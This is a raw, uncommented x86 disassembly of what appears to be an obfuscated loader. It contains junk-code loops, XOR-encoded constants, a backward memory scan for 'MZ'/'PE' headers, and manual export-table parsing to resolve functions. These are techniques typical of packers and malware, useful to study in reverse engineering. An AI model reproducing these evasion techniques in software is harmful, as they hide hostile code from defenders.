  414e14:	cmp    DWORD PTR ds:0x4377b7,0x0
  414e1b:	je     0x414e6a
  414e21:	cmp    DWORD PTR ds:0x4377b7,0xa
  414e28:	jle    0x414e6a
  414e2e:	jmp    0x414e3c
  414e33:	push   DWORD PTR [ebp-0xc]
  414e36:	call   DWORD PTR ds:0x43c9d4
  414e3c:	cmp    DWORD PTR ds:0x4377b7,0xb
  414e43:	jne    0x414e56
  414e49:	mov    ecx,DWORD PTR ds:0x4377b7
  414e4f:	dec    ecx
  414e50:	mov    DWORD PTR ds:0x4377b7,ecx
  414e56:	xor    ecx,ecx
  414e58:	add    ecx,DWORD PTR ds:0x4377b7
  414e5e:	dec    ecx
  414e5f:	mov    DWORD PTR ds:0x4377b7,ecx
  414e65:	jmp    0x414e14
  414e6a:	lea    eax,[ebp-0x4]
  414e6d:	mov    DWORD PTR [ebp-0x10],eax
  414e70:	and    DWORD PTR ds:0x4377bb,0x67f5
  414e7a:	mov    eax,DWORD PTR [ebp-0x4]
  414e7d:	and    DWORD PTR ds:0x437757,0x0
  414e87:	mov    ecx,DWORD PTR ds:0x437757
  414e8d:	inc    ecx
  414e8e:	mov    DWORD PTR ds:0x437757,ecx
  414e94:	cmp    DWORD PTR ds:0x437757,0xc
  414e9b:	ja     0x414ed8
  414ea1:	jmp    0x414eb1
  414ea6:	push   0x437723
  414eab:	call   DWORD PTR ds:0x43c9dc
  414eb1:	cmp    DWORD PTR ds:0x437757,0xb
  414eb8:	jne    0x414ecb
  414ebe:	mov    ecx,DWORD PTR ds:0x437757
  414ec4:	inc    ecx
  414ec5:	mov    DWORD PTR ds:0x437757,ecx
  414ecb:	cmp    DWORD PTR ds:0x437757,0x12
  414ed2:	jb     0x414e87
  414ed8:	xor    eax,0x75108b5
  414edd:	add    eax,0x3272fb
  414ee2:	neg    ecx
  414ee4:	mov    ecx,DWORD PTR [ebp-0x10]
  414ee7:	neg    DWORD PTR ds:0x437757
  414eed:	mov    DWORD PTR [ecx],eax
  414eef:	mov    DWORD PTR ds:0x43775b,0x15
  414ef9:	cmp    DWORD PTR ds:0x43775b,0x0
  414f00:	je     0x414f37
  414f06:	cmp    DWORD PTR ds:0x43775b,0x1f
  414f0d:	jg     0x414f37
  414f13:	jmp    0x414f23
  414f18:	push   0x3993
  414f1d:	call   DWORD PTR ds:0x43c9e0
  414f23:	xor    ecx,ecx
  414f25:	xor    ecx,DWORD PTR ds:0x43775b
  414f2b:	dec    ecx
  414f2c:	mov    DWORD PTR ds:0x43775b,ecx
  414f32:	jmp    0x414ef9
  414f37:	xor    eax,eax
  414f39:	add    DWORD PTR ds:0x437773,ecx
  414f3f:	mov    eax,ds:0x437217
  414f44:	mov    eax,DWORD PTR [eax]
  414f46:	sbb    DWORD PTR ds:0x4377ab,ebx
  414f4c:	mov    ecx,DWORD PTR [ebp-0x14]
  414f4f:	add    eax,DWORD PTR [ecx]
  414f51:	mov    DWORD PTR [ebp-0xc],eax
  414f54:	mov    eax,ds:0x43739f
  414f59:	mov    eax,DWORD PTR [eax+0x198]
  414f5f:	xor    DWORD PTR ds:0x43771b,0x3e1f
  414f69:	mov    ecx,DWORD PTR [ebp+0x8]
  414f6c:	add    DWORD PTR ds:0x437723,0x6248
  414f76:	xor    ecx,0x75108b5
  414f7c:	xor    DWORD PTR ds:0x437747,0x991
  414f86:	add    ecx,0x3272fb
  414f8c:	mov    DWORD PTR ds:0x43774b,0x3d8f
  414f96:	cmp    DWORD PTR [eax],ecx
  414f98:	je     0x414fb2
  414f9e:	mov    DWORD PTR ds:0x437727,0x79bb
  414fa8:	jmp    0x41548c
  414fad:	jmp    0x41548c
  414fb2:	mov    DWORD PTR ds:0x437767,0x75b9
  414fbc:	mov    eax,DWORD PTR [ebp+0x8]
  414fbf:	mov    DWORD PTR ds:0x4377b7,0x4cc7
  414fc9:	cmp    eax,DWORD PTR [ebp+0xc]
  414fcc:	mov    DWORD PTR ds:0x4377ab,0x4de3
  414fd6:	je     0x41548c
  414fdc:	or     ecx,edx
  414fde:	lea    eax,[ebp-0x18]
  414fe1:	mov    DWORD PTR [ebp-0x34],eax
  414fe4:	or     DWORD PTR ds:0x437753,0x437727
  414fee:	mov    eax,DWORD PTR [ebp+0x10]
  414ff1:	mov    edx,DWORD PTR ds:0x437793
  414ff7:	and    DWORD PTR ds:0x437713,edx
  414ffd:	xor    eax,0x75108b5
  415002:	add    eax,0x3272fb
  415007:	mov    ecx,DWORD PTR [ebp-0x34]
  41500a:	mov    DWORD PTR [ecx],eax
  41500c:	mov    eax,DWORD PTR [ebp+0x8]
  41500f:	sbb    ecx,ecx
  415011:	xor    eax,0x75108b5
  415016:	or     ecx,DWORD PTR ds:0x437767
  41501c:	add    eax,0x3272fb
  415021:	mov    ecx,DWORD PTR [ebp+0xc]
  415024:	xor    DWORD PTR ds:0x437767,0x1dfa
  41502e:	xor    ecx,0x75108b5
  415034:	not    DWORD PTR ds:0x437793
  41503a:	add    ecx,0x3272fb
  415040:	mov    edx,DWORD PTR [ebp-0xc]
  415043:	imul   ecx,DWORD PTR [edx]
  415046:	mov    DWORD PTR ds:0x4377a3,0x407a
  415050:	cmp    eax,ecx
  415052:	mov    DWORD PTR ds:0x437747,0x4754
  41505c:	je     0x415286
  415062:	sub    DWORD PTR ds:0x437773,ebx
  415068:	mov    eax,DWORD PTR [ebp-0x14]
  41506b:	inc    ecx
  41506c:	mov    DWORD PTR [ebp-0x4c],eax
  41506f:	mov    eax,DWORD PTR [ebp-0x4c]
  415072:	mov    ecx,DWORD PTR [ebp-0x18]
  415075:	sub    DWORD PTR ds:0x437757,0x437737
  41507f:	add    ecx,DWORD PTR [eax]
  415081:	and    DWORD PTR ds:0x43779f,0x0
  41508b:	xor    eax,eax
  41508d:	xor    eax,DWORD PTR ds:0x43779f
  415093:	inc    eax
  415094:	mov    ds:0x43779f,eax
  415099:	cmp    DWORD PTR ds:0x43779f,0x6
  4150a0:	jl     0x4150e8
  4150a6:	jmp    0x4150c3
  4150ab:	push   0x43772b
  4150b0:	push   0x765e
  4150b5:	push   DWORD PTR [ebp-0x24]
  4150b8:	push   0x1ae5
  4150bd:	call   DWORD PTR ds:0x43c9e4
  4150c3:	cmp    DWORD PTR ds:0x43779f,0x5
  4150ca:	jne    0x4150db
  4150d0:	mov    eax,ds:0x43779f
  4150d5:	inc    eax
  4150d6:	mov    ds:0x43779f,eax
  4150db:	cmp    DWORD PTR ds:0x43779f,0x1c
  4150e2:	jb     0x41508b
  4150e8:	mov    eax,DWORD PTR [ebp-0x4c]
  4150eb:	add    DWORD PTR ds:0x437767,0x43771f
  4150f5:	mov    DWORD PTR [eax],ecx
  4150f7:	adc    DWORD PTR ds:0x43771f,0x57c4
  415101:	mov    eax,DWORD PTR [ebp-0x14]
  415104:	mov    DWORD PTR [ebp-0x50],eax
  415107:	and    DWORD PTR ds:0x43774b,0x0
  415111:	mov    ecx,DWORD PTR ds:0x43774b
  415117:	inc    ecx
  415118:	mov    DWORD PTR ds:0x43774b,ecx
  41511e:	cmp    DWORD PTR ds:0x43774b,0x4
  415125:	jbe    0x415167
  41512b:	jmp    0x415140
  415130:	push   0x437773
  415135:	push   0x69a7
  41513a:	call   DWORD PTR ds:0x43c9e8
  415140:	cmp    DWORD PTR ds:0x43774b,0x3
  415147:	jne    0x41515a
  41514d:	mov    ecx,DWORD PTR ds:0x43774b
  415153:	inc    ecx
  415154:	mov    DWORD PTR ds:0x43774b,ecx
  41515a:	cmp    DWORD PTR ds:0x43774b,0x16
  415161:	jb     0x415111
  415167:	mov    eax,DWORD PTR [ebp+0xc]
  41516a:	xor    eax,0x75108b5
  41516f:	add    eax,0x3272fb
  415174:	and    DWORD PTR ds:0x43774b,0x0
  41517e:	mov    ecx,DWORD PTR ds:0x43774b
  415184:	inc    ecx
  415185:	mov    DWORD PTR ds:0x43774b,ecx
  41518b:	cmp    DWORD PTR ds:0x43774b,0x6
  415192:	jbe    0x4151ec
  415198:	jmp    0x4151c5
  41519d:	push   0x69fb
  4151a2:	push   DWORD PTR [ebp-0x14]
  4151a5:	push   0x4075
  4151aa:	push   0x1f01
  4151af:	push   DWORD PTR [ebp-0x1c]
  4151b2:	push   0x802b
  4151b7:	push   DWORD PTR [ebp-0x28]
  4151ba:	push   0x43700d
  4151bf:	call   DWORD PTR ds:0x43c9ec
  4151c5:	cmp    DWORD PTR ds:0x43774b,0x5
  4151cc:	jne    0x4151df
  4151d2:	mov    ecx,DWORD PTR ds:0x43774b
  4151d8:	inc    ecx
  4151d9:	mov    DWORD PTR ds:0x43774b,ecx
  4151df:	cmp    DWORD PTR ds:0x43774b,0x11
  4151e6:	jb     0x41517e
  4151ec:	mov    ecx,DWORD PTR [ebp-0x50]
  4151ef:	imul   eax,DWORD PTR [ecx]
  4151f2:	sbb    ecx,0xf91
  4151f8:	mov    ecx,DWORD PTR [ebp-0x50]
  4151fb:	mov    DWORD PTR ds:0x437747,0x499d
  415205:	mov    DWORD PTR [ecx],eax
  415207:	mov    eax,DWORD PTR [ebp-0x14]
  41520a:	mov    DWORD PTR ds:0x437777,0x1a
  415214:	cmp    DWORD PTR ds:0x437777,0x0
  41521b:	je     0x415265
  415221:	cmp    DWORD PTR ds:0x437777,0x21
  415228:	jbe    0x415265
  41522e:	jmp    0x415253
  415233:	push   0x3847
  415238:	push   0x437787
  41523d:	push   DWORD PTR [ebp-0x28]
  415240:	push   DWORD PTR [ebp-0x10]
  415243:	push   0x4f57
  415248:	push   0x7258
  41524d:	call   DWORD PTR ds:0x43c9f0
  415253:	mov    ecx,DWORD PTR ds:0x437777
  415259:	dec    ecx
  41525a:	mov    DWORD PTR ds:0x437777,ecx
  415260:	jmp    0x415214
  415265:	mov    DWORD PTR [ebp-0x54],eax
  415268:	mov    eax,DWORD PTR [ebp+0x10]
  41526b:	xor    eax,0x75108b5
  415270:	add    eax,0x3272fb
  415275:	mov    ecx,DWORD PTR [ebp-0x54]
  415278:	mov    ecx,DWORD PTR [ecx]
  41527a:	sub    ecx,eax
  41527c:	mov    eax,DWORD PTR [ebp-0x54]
  41527f:	mov    DWORD PTR [eax],ecx
  415281:	jmp    0x4152b8
  415286:	mov    eax,DWORD PTR [ebp-0x14]
  415289:	mov    DWORD PTR [ebp-0x58],eax
  41528c:	mov    eax,DWORD PTR [ebp+0x14]
  41528f:	mov    ecx,DWORD PTR [ebp-0x58]
  415292:	xor    eax,DWORD PTR [ecx]
  415294:	mov    ecx,DWORD PTR [ebp-0x58]
  415297:	mov    DWORD PTR [ecx],eax
  415299:	mov    eax,DWORD PTR [ebp-0x14]
  41529c:	mov    DWORD PTR [ebp-0x5c],eax
  41529f:	mov    eax,DWORD PTR [ebp+0x10]
  4152a2:	xor    eax,0x75108b5
  4152a7:	add    eax,0x3272fb
  4152ac:	mov    ecx,DWORD PTR [ebp-0x5c]
  4152af:	mov    ecx,DWORD PTR [ecx]
  4152b1:	sub    ecx,eax
  4152b3:	mov    eax,DWORD PTR [ebp-0x5c]
  4152b6:	mov    DWORD PTR [eax],ecx
  4152b8:	mov    eax,DWORD PTR [ebp-0x14]
  4152bb:	mov    ecx,DWORD PTR [ebp-0xc]
  4152be:	add    ecx,DWORD PTR [eax]
  4152c0:	mov    DWORD PTR [ebp-0xc],ecx
  4152c3:	mov    eax,DWORD PTR [ebp+0xc]
  4152c6:	xor    eax,0x75108b5
  4152cb:	add    eax,0x3272fb
  4152d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4152d3:	xor    ecx,0x75108b5
  4152d9:	mov    edx,DWORD PTR [ebp+0xc]
  4152dc:	xor    edx,0x75108b5
  4152e2:	lea    ecx,[ecx+edx*1+0x64e5f6]
  4152e9:	mov    edx,DWORD PTR [ebp+0xc]
  4152ec:	xor    edx,0x75108b5
  4152f2:	add    edx,0x3272fb
  4152f8:	imul   ecx,edx
  4152fb:	sub    eax,ecx
  4152fd:	mov    ecx,DWORD PTR [ebp-0x14]
  415300:	cmp    DWORD PTR [ecx],eax
  415302:	jg     0x41532c
  415308:	mov    eax,DWORD PTR [ebp-0x14]
  41530b:	mov    DWORD PTR [ebp-0x60],eax
  41530e:	mov    eax,DWORD PTR [ebp+0x10]
  415311:	xor    eax,0x75108b5
  415316:	add    eax,0x3272fb
  41531b:	mov    ecx,DWORD PTR [ebp-0x60]
  41531e:	mov    ecx,DWORD PTR [ecx]
  415320:	sub    ecx,eax
  415322:	mov    eax,DWORD PTR [ebp-0x60]
  415325:	mov    DWORD PTR [eax],ecx
  415327:	jmp    0x41534b
  41532c:	mov    eax,DWORD PTR [ebp-0x14]
  41532f:	mov    DWORD PTR [ebp-0x64],eax
  415332:	mov    eax,DWORD PTR [ebp+0x10]
  415335:	xor    eax,0x75108b5
  41533a:	mov    ecx,DWORD PTR [ebp-0x64]
  41533d:	mov    ecx,DWORD PTR [ecx]
  41533f:	lea    eax,[eax+ecx*1+0x3272fb]
  415346:	mov    ecx,DWORD PTR [ebp-0x64]
  415349:	mov    DWORD PTR [ecx],eax
  41534b:	mov    eax,DWORD PTR [ebp-0xc]
  41534e:	mov    eax,DWORD PTR [eax]
  415350:	mov    DWORD PTR [ebp-0x2c],eax
  415353:	mov    eax,DWORD PTR [ebp-0x8]
  415356:	xor    eax,0x75108b5
  41535b:	add    eax,0x3272fa
  415360:	not    eax
  415362:	and    eax,DWORD PTR [ebp-0x2c]
  415365:	mov    DWORD PTR [ebp-0x2c],eax
  415368:	lea    eax,[ebp-0x20]
  41536b:	mov    DWORD PTR [ebp-0x38],eax
  41536e:	mov    eax,DWORD PTR [ebp-0x38]
  415371:	mov    DWORD PTR [eax],0x7097b85d
  415377:	mov    DWORD PTR [eax+0x4],0xffffffff
  41537e:	lea    eax,[ebp-0x28]
  415381:	mov    DWORD PTR [ebp-0x30],eax
  415384:	mov    eax,DWORD PTR [ebp-0x30]
  415387:	mov    DWORD PTR [eax],0x7097a55f
  41538d:	mov    DWORD PTR [eax+0x4],0xffffffff
  415394:	mov    eax,DWORD PTR [ebp-0x2c]
  415397:	movzx  eax,WORD PTR [eax]
  41539a:	mov    ecx,DWORD PTR [ebp-0x20]
  41539d:	mov    edx,DWORD PTR [ebp-0x1c]
  4153a0:	xor    ecx,0x8a29a14b
  4153a6:	xor    edx,0x0
  4153a9:	add    ecx,0x5424137
  4153af:	adc    edx,0x0
  4153b2:	movzx  ecx,cx
  4153b5:	cmp    eax,ecx
  4153b7:	je     0x4153dc
  4153bd:	mov    eax,DWORD PTR [ebp-0x8]
  4153c0:	xor    eax,0x75108b5
  4153c5:	add    eax,0x3272fb
  4153ca:	mov    ecx,DWORD PTR [ebp-0x2c]
  4153cd:	sub    ecx,eax
  4153cf:	mov    DWORD PTR [ebp-0x2c],ecx
  4153d2:	jmp    0x415368
  4153d7:	jmp    0x41548c
  4153dc:	lea    eax,[ebp-0x44]
  4153df:	mov    DWORD PTR [ebp-0x40],eax
  4153e2:	mov    eax,DWORD PTR [ebp-0x2c]
  4153e5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4153e8:	add    ecx,DWORD PTR [eax+0x3c]
  4153eb:	mov    eax,DWORD PTR [ebp-0x10]
  4153ee:	mov    eax,DWORD PTR [eax]
  4153f0:	mov    edx,DWORD PTR [ebp-0x40]
  4153f3:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4153f7:	mov    DWORD PTR [edx],eax
  4153f9:	lea    eax,[ebp-0x3c]
  4153fc:	mov    DWORD PTR [ebp-0x48],eax
  4153ff:	mov    eax,DWORD PTR [ebp+0x8]
  415402:	xor    eax,0x75108b5
  415407:	add    eax,0x3272fb
  41540c:	mov    ecx,DWORD PTR [ebp-0x48]
  41540f:	mov    DWORD PTR [ecx],eax
  415411:	mov    eax,DWORD PTR [ebp-0x44]
  415414:	mov    ecx,DWORD PTR [ebp+0x8]
  415417:	xor    ecx,0x75108b5
  41541d:	add    ecx,0x3272fb
  415423:	cmp    eax,ecx
  415425:	je     0x41547b
  41542b:	mov    eax,DWORD PTR [ebp-0x2c]
  41542e:	add    eax,DWORD PTR [ebp-0x44]
  415431:	mov    ecx,DWORD PTR [ebp-0x48]
  415434:	mov    DWORD PTR [ecx],eax
  415436:	mov    eax,DWORD PTR [ebp-0x3c]
  415439:	mov    eax,DWORD PTR [eax+0xc]
  41543c:	mov    ecx,DWORD PTR [ebp-0x2c]
  41543f:	movzx  eax,WORD PTR [ecx+eax*1]
  415443:	mov    ecx,DWORD PTR [ebp-0x28]
  415446:	mov    edx,DWORD PTR [ebp-0x24]
  415449:	xor    ecx,0x8a29a14b
  41544f:	xor    edx,0x0
  415452:	add    ecx,0x5424137
  415458:	adc    edx,0x0
  41545b:	movzx  ecx,cx
  41545e:	cmp    eax,ecx
  415460:	jne    0x41547b
  415466:	mov    eax,ds:0x43739f
  41546b:	mov    eax,DWORD PTR [eax+0x198]
  415471:	mov    ecx,DWORD PTR [ebp-0x2c]
  415474:	mov    DWORD PTR [eax],ecx
  415476:	jmp    0x41548c
  41547b:	push   DWORD PTR [ebp+0x14]
  41547e:	push   DWORD PTR [ebp+0x10]
  415481:	push   DWORD PTR [ebp+0xc]
  415484:	push   DWORD PTR [ebp+0x8]
  415487:	call   0x414de4
  41548c:	leave  
  41548d:	ret    0x10
  415490:	push   ebp
  415491:	mov    ebp,esp
  415493:	push   ecx
  415494:	or     DWORD PTR ds:0x437737,0x437717
  41549e:	push   ecx
  41549f:	sub    DWORD PTR ds:0x437757,ebx
  4154a5:	lea    eax,[ebp-0x8]
  4154a8:	adc    ecx,DWORD PTR ds:0x43778b
  4154ae:	mov    DWORD PTR [ebp-0x4],eax
  4154b1:	mov    eax,ds:0x43775b
  4154b6:	xor    DWORD PTR ds:0x43777f,eax
  4154bc:	mov    eax,DWORD PTR [ebp-0x8]
  4154bf:	and    ecx,DWORD PTR ds:0x43776f
  4154c5:	mov    ecx,DWORD PTR [ebp-0x4]
  4154c8:	mov    ecx,DWORD PTR [ecx]
  4154ca:	sub    eax,ecx
  4154cc:	mov    DWORD PTR [ebp-0x8],eax
  4154cf:	or     DWORD PTR ds:0x437733,0x437787
  4154d9:	xor    eax,eax
  4154db:	and    DWORD PTR ds:0x437747,0x0
  4154e5:	xor    ecx,ecx
  4154e7:	or     ecx,DWORD PTR ds:0x437747
  4154ed:	inc    ecx
  4154ee:	mov    DWORD PTR ds:0x437747,ecx
  4154f4:	cmp    DWORD PTR ds:0x437747,0x1d
  4154fb:	jbe    0x41552d
  415501:	jmp    0x415520
  415506:	push   0x43772f
  41550b:	push   0x43773f
  415510:	push   0x7558
  415515:	push   0x4370a4
  41551a:	call   DWORD PTR ds:0x43c9f4
  415520:	cmp    DWORD PTR ds:0x437747,0x1c
  415527:	jb     0x4154e5
  41552d:	mov    eax,DWORD PTR [ebp-0x4]
  415530:	not    DWORD PTR ds:0x43778f
  415536:	mov    eax,DWORD PTR [eax]
  415538:	and    DWORD PTR ds:0x437767,0x0
  415542:	mov    ecx,DWORD PTR ds:0x437767
  415548:	inc    ecx
  415549:	mov    DWORD PTR ds:0x437767,ecx
  41554f:	cmp    DWORD PTR ds:0x437767,0x7
  415556:	jb     0x41559b
  41555c:	jmp    0x415574
  415561:	push   0x437767
  415566:	push   0x437733
  41556b:	push   DWORD PTR [ebp-0x28]
  41556e:	call   DWORD PTR ds:0x43c9f8
  415574:	cmp    DWORD PTR ds:0x437767,0x6
  41557b:	jne    0x41558e
  415581:	mov    ecx,DWORD PTR ds:0x437767
  415587:	inc    ecx
  415588:	mov    DWORD PTR ds:0x437767,ecx
  41558e:	cmp    DWORD PTR ds:0x437767,0x12
  415595:	jb     0x415542
  41559b:	xor    eax,0xf89c85bc
  4155a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4155a3:	mov    DWORD PTR [ecx],eax
  4155a5:	mov    eax,DWORD PTR [ebp+0xc]
  4155a8:	xor    eax,0x75108b5
  4155ad:	add    eax,0x3272fb
  4155b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4155b5:	mov    DWORD PTR [ecx+0x4],eax
  4155b8:	mov    eax,DWORD PTR [ebp+0x14]
  4155bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4155be:	mov    DWORD PTR [ecx+0x8],eax
  4155c1:	mov    eax,DWORD PTR [ebp+0x18]
  4155c4:	mov    ecx,DWORD PTR [ebp+0x10]
  4155c7:	mov    DWORD PTR [ecx+0xc],eax
  4155ca:	mov    eax,DWORD PTR [ebp+0x1c]
  4155cd:	mov    ecx,DWORD PTR [ebp+0x10]
  4155d0:	mov    DWORD PTR [ecx+0x10],eax
  4155d3:	mov    eax,DWORD PTR [ebp-0x8]
  4155d6:	xor    eax,0x75108b5
  4155db:	add    eax,0x3272fb
  4155e0:	mov    ecx,DWORD PTR [ebp+0x10]
  4155e3:	mov    DWORD PTR [ecx],eax
  4155e5:	mov    eax,DWORD PTR [ebp+0x8]
  4155e8:	xor    eax,0x75108b5
  4155ed:	add    eax,0x3272fb
  4155f2:	leave  
  4155f3:	ret    0x18
  4155f6:	push   ebp
  4155f7:	mov    ebp,esp
  4155f9:	sub    esp,0x1ac
  4155ff:	add    eax,DWORD PTR ds:0x4377a7
  415605:	push   esi
  415606:	add    DWORD PTR ds:0x43771b,0x43779b
  415610:	mov    eax,DWORD PTR [ebp+0x8]
  415613:	xor    eax,0x75108b5
  415618:	add    eax,0x3272fb
  41561d:	xor    DWORD PTR ds:0x43777f,0x43779f
  415627:	mov    DWORD PTR [ebp-0x20],eax
  41562a:	movzx  eax,BYTE PTR ds:0x437797
  415631:	adc    eax,DWORD PTR ds:0x4377a3
  415637:	mov    ds:0x437797,eax
  41563c:	mov    eax,ds:0x43721f
  415641:	mov    eax,DWORD PTR [eax]
  415643:	xor    DWORD PTR ds:0x437787,0xb5b
  41564d:	mov    DWORD PTR [ebp-0x10],eax
  415650:	movzx  eax,BYTE PTR ds:0x4377a7
  415657:	and    eax,DWORD PTR ds:0x437793
  41565d:	mov    ds:0x4377a7,eax
  415662:	mov    eax,ds:0x43742f
  415667:	mov    eax,DWORD PTR [eax]
  415669:	mov    DWORD PTR [ebp-0x14],eax
  41566c:	inc    eax
  41566d:	mov    eax,DWORD PTR [ebp-0x10]
  415670:	and    DWORD PTR ds:0x4377a3,0x4377b3
  41567a:	xor    ecx,ecx
  41567c:	sub    eax,0x5424137
  415681:	mov    DWORD PTR ds:0x43779b,0x4f0f
  41568b:	sbb    ecx,0x0
  41568e:	xor    eax,0x8a29a14b
  415693:	sub    DWORD PTR ds:0x43772f,0x7a71
  41569d:	xor    ecx,0x0
  4156a0:	mov    DWORD PTR [ebp-0x1a4],eax
  4156a6:	mov    DWORD PTR ds:0x43777b,0x4c82
  4156b0:	mov    DWORD PTR [ebp-0x1a0],ecx
  4156b6:	mov    DWORD PTR ds:0x437793,0x4615
  4156c0:	cmp    DWORD PTR [ebp-0x1a4],0x70941f82
  4156ca:	jne    0x4156f1
  4156d0:	mov    DWORD PTR ds:0x43776f,0x15aa
  4156da:	cmp    DWORD PTR [ebp-0x1a0],0xffffffff
  4156e1:	mov    DWORD PTR ds:0x437733,0x56fb
  4156eb:	je     0x415a9e
  4156f1:	and    DWORD PTR ds:0x437767,0x0
  4156fb:	jmp    0x41570b
  415700:	mov    eax,ds:0x437767
  415705:	inc    eax
  415706:	mov    ds:0x437767,eax
  41570b:	cmp    DWORD PTR ds:0x437767,0x14
  415712:	jae    0x415748
  415718:	cmp    DWORD PTR ds:0x437767,0x1f
  41571f:	jge    0x415748
  415725:	jmp    0x415743
  41572a:	push   0x3245
  41572f:	push   DWORD PTR [ebp-0xc]
  415732:	push   DWORD PTR [ebp-0x20]
  415735:	push   0x2d62
  41573a:	push   DWORD PTR [ebp-0x1c]
  41573d:	call   DWORD PTR ds:0x43c9fc
  415743:	jmp    0x415700
  415748:	mov    eax,DWORD PTR [ebp-0x14]
  41574b:	sub    DWORD PTR ds:0x437753,0x4f0
  415755:	xor    ecx,ecx
  415757:	xor    DWORD PTR ds:0x437777,0x1d12
  415761:	sub    eax,0x5424137
  415766:	mov    DWORD PTR ds:0x437777,0x6f96
  415770:	sbb    ecx,0x0
  415773:	xor    eax,0x8a29a14b
  415778:	xor    ecx,0x0
  41577b:	mov    DWORD PTR [ebp-0x1ac],eax
  415781:	mov    DWORD PTR ds:0x43775b,0x49f3
  41578b:	mov    DWORD PTR [ebp-0x1a8],ecx
  415791:	cmp    DWORD PTR [ebp-0x1ac],0x70941f82
  41579b:	mov    DWORD PTR ds:0x437773,0xfeb
  4157a5:	jne    0x4157c2
  4157ab:	mov    DWORD PTR ds:0x43773f,0x71a9
  4157b5:	cmp    DWORD PTR [ebp-0x1a8],0xffffffff
  4157bc:	je     0x415a9e
  4157c2:	dec    eax
  4157c3:	mov    eax,DWORD PTR [ebp+0x10]
  4157c6:	xor    ecx,ecx
  4157c8:	or     ecx,DWORD PTR ds:0x43776b
  4157ce:	sbb    ecx,DWORD PTR ds:0x43772f
  4157d4:	mov    DWORD PTR ds:0x43776b,ecx
  4157da:	xor    eax,0x75108b5
  4157df:	xor    ecx,ecx
  4157e1:	or     ecx,DWORD PTR ds:0x438527
  4157e7:	mov    ecx,DWORD PTR [ecx]
  4157e9:	and    DWORD PTR ds:0x43772f,ecx
  4157ef:	add    eax,0x3272fb
  4157f4:	xor    ecx,DWORD PTR ds:0x43779f
  4157fa:	mov    DWORD PTR [ebp-0x1c],eax
  4157fd:	mov    DWORD PTR ds:0x437727,0x14
  415807:	cmp    DWORD PTR ds:0x437727,0x0
  41580e:	je     0x415862
  415814:	cmp    DWORD PTR ds:0x437727,0x5
  41581b:	ja     0x415862
  415821:	jmp    0x41583a
  415826:	push   DWORD PTR [ebp-0x28]
  415829:	push   DWORD PTR [ebp-0x14]
  41582c:	push   0x4370f4
  415831:	push   DWORD PTR [ebp-0x18]
  415834:	call   DWORD PTR ds:0x43ca00
  41583a:	cmp    DWORD PTR ds:0x437727,0x6
  415841:	jne    0x415852
  415847:	mov    eax,ds:0x437727
  41584c:	dec    eax
  41584d:	mov    ds:0x437727,eax
  415852:	mov    eax,ds:0x437727
  415857:	dec    eax
  415858:	mov    ds:0x437727,eax
  41585d:	jmp    0x415807
  415862:	mov    eax,ds:0x43739f
  415867:	mov    DWORD PTR [ebp-0x18],eax
  41586a:	movzx  ecx,BYTE PTR ds:0x43770f
  415871:	xor    DWORD PTR ds:0x43775b,ecx
  415877:	mov    eax,DWORD PTR [ebp-0x10]
  41587a:	and    DWORD PTR ds:0x4377b3,0x0
  415884:	jmp    0x415896
  415889:	mov    ecx,DWORD PTR ds:0x4377b3
  41588f:	inc    ecx
  415890:	mov    DWORD PTR ds:0x4377b3,ecx
  415896:	cmp    DWORD PTR ds:0x4377b3,0x1b
  41589d:	jae    0x4158c5
  4158a3:	cmp    DWORD PTR ds:0x4377b3,0x21
  4158aa:	jb     0x4158c5
  4158b0:	jmp    0x4158c0
  4158b5:	push   0x6097
  4158ba:	call   DWORD PTR ds:0x43ca04
  4158c0:	jmp    0x415889
  4158c5:	mov    DWORD PTR [ebp-0x24],eax
  4158c8:	mov    eax,DWORD PTR [ebp-0x14]
  4158cb:	add    eax,0x4
  4158ce:	mov    ecx,DWORD PTR [ebp-0x24]
  4158d1:	sub    DWORD PTR ds:0x43771f,0x631a
  4158db:	sub    eax,ecx
  4158dd:	mov    DWORD PTR [ebp-0x4],eax
  4158e0:	xor    eax,0x956
  4158e5:	mov    DWORD PTR [ebp-0x78],0xf89c85bc
  4158ec:	xor    eax,DWORD PTR ds:0x43775f
  4158f2:	mov    eax,DWORD PTR [ebp-0x24]
  4158f5:	mov    DWORD PTR [ebp-0x74],eax
  4158f8:	mov    DWORD PTR ds:0x437723,0x1a
  415902:	cmp    DWORD PTR ds:0x437723,0x0
  415909:	je     0x415955
  41590f:	cmp    DWORD PTR ds:0x437723,0xa
  415916:	jle    0x415955
  41591c:	jmp    0x41592d
  415921:	push   DWORD PTR [ebp-0x1c]
  415924:	push   DWORD PTR [ebp-0x1c]
  415927:	call   DWORD PTR ds:0x43ca08
  41592d:	cmp    DWORD PTR ds:0x437723,0xb
  415934:	jne    0x415945
  41593a:	mov    eax,ds:0x437723
  41593f:	dec    eax
  415940:	mov    ds:0x437723,eax
  415945:	mov    eax,ds:0x437723
  41594a:	dec    eax
  41594b:	mov    ds:0x437723,eax
  415950:	jmp    0x415902
  415955:	mov    eax,DWORD PTR [ebp-0x4]
  415958:	or     DWORD PTR ds:0x43774f,0x437717
  415962:	mov    DWORD PTR [ebp-0x70],eax
  415965:	xor    DWORD PTR ds:0x43771f,ebx
  41596b:	mov    eax,DWORD PTR [ebp+0x14]
  41596e:	xor    DWORD PTR ds:0x437713,0x4377af
  415978:	xor    eax,0x75108b5
  41597d:	xor    DWORD PTR ds:0x43770f,0x6763
  415987:	add    eax,0x3272fb
  41598c:	add    DWORD PTR ds:0x4377bb,0x6c9b
  415996:	mov    DWORD PTR [ebp-0x6c],eax
  415999:	sub    DWORD PTR ds:0x437723,0x4377af
  4159a3:	lea    eax,[ebp-0xc]
  4159a6:	not    DWORD PTR ds:0x43777b
  4159ac:	mov    DWORD PTR [ebp-0x68],eax
  4159af:	neg    DWORD PTR ds:0x43772f
  4159b5:	mov    eax,DWORD PTR [ebp-0x78]
  4159b8:	xor    DWORD PTR ds:0x437787,0x23e8
  4159c2:	xor    eax,0x75108b5
  4159c7:	sub    DWORD PTR ds:0x4377b3,0x919
  4159d1:	add    eax,0x3272fb
  4159d6:	mov    DWORD PTR [ebp-0x78],eax
  4159d9:	adc    DWORD PTR ds:0x4377af,0x561d
  4159e3:	lea    eax,[ebp-0x78]
  4159e6:	sub    DWORD PTR ds:0x43776b,0x437783
  4159f0:	push   eax
  4159f1:	mov    eax,ds:0x437787
